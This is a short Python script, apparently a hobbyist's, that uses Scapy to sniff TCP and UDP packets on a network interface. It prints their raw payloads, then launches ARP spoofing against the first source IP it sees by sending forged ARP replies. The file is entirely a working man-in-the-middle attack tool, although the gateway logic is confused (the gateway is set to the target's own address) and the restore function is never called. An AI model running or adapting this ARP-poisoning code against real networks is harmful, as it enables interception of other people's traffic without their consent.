#Import necessary modules from Scapy for packet manipulation
from scapy.all import sniff, Raw
from scapy.layers.inet import IP, UDP, TCP
import scapy.all as scapy

connection_info = None # Variable to store initial connection information

#----------------------------
def handle_packet(packet):

    global ip_target

    if IP in packet: #Find IP packets
        if UDP in packet or TCP in packet: #find both TCP and UDP packets
            if Raw in packet:  #find packets with a Raw field

                print(packet.summary())  # prints a summary of the packet
                raw_payload = packet[Raw].load

                print("Source IP:", packet[IP].src)
                print("Destination IP:", packet[IP].dst)
                print("Raw payload:", raw_payload)

                if ip_target is None:
                    ip_target = packet[IP].src
                    ip_gateway = ip_target #Not sure if ethernet has a gateway ip. Keep it the same for now

                    print(f"Target IP: {ip_target}. Attempting Spoof")
                    print("------------------------")

                    spoof(ip_target, ip_gateway)
                    spoof(ip_gateway, ip_target)

#----------------------------
def spoof(target_ip, spoof_ip):
    #ARP have operation code 2, pdst sets target ip, hwdst sets target MAC address, psrc sets the new ip (spoofed one)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = scapy.getmacbyip(target_ip), psrc = spoof_ip)

    #verbose keeps output clean (limits info in output)
    scapy.send(packet, verbose = False)
#---------------------------
def restore(destination_ip, source_ip):
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)
#---------------------------
# Start sniffing
ip_target = None
sniff(iface="en10", prn=handle_packet)



